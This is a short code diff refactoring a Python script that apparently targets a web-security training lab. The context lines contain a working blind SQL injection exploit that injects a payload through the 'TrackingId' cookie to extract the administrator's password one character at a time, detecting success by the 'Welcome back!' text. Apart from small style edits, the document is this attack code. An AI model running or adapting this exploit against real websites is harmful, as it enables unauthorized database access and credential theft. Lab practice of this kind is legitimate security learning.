@@ -6,10 +6,7 @@ import sys
 
 def search_text(response):
     soup = BeautifulSoup(response.text, 'html.parser')
-    if "Welcome back!" in soup.text:
-        return True
-    else:
-        return False
+    return "Welcome back!" in soup.text
 
 
 def enumerate_password_length(url):
@@ -32,9 +29,10 @@ def enumerate_password(url, password_length):
             payload = f"ABC' OR (select username from users where username='administrator' AND SUBSTRING(password,{i},1)='{j}')='administrator"
             response = requests.get(url, cookies={"TrackingId": payload})
             if search_text(response):
-                password = password + j
+                password += j
                 print(j, end='', flush=True)
                 break
+
 
 def main():
     try:
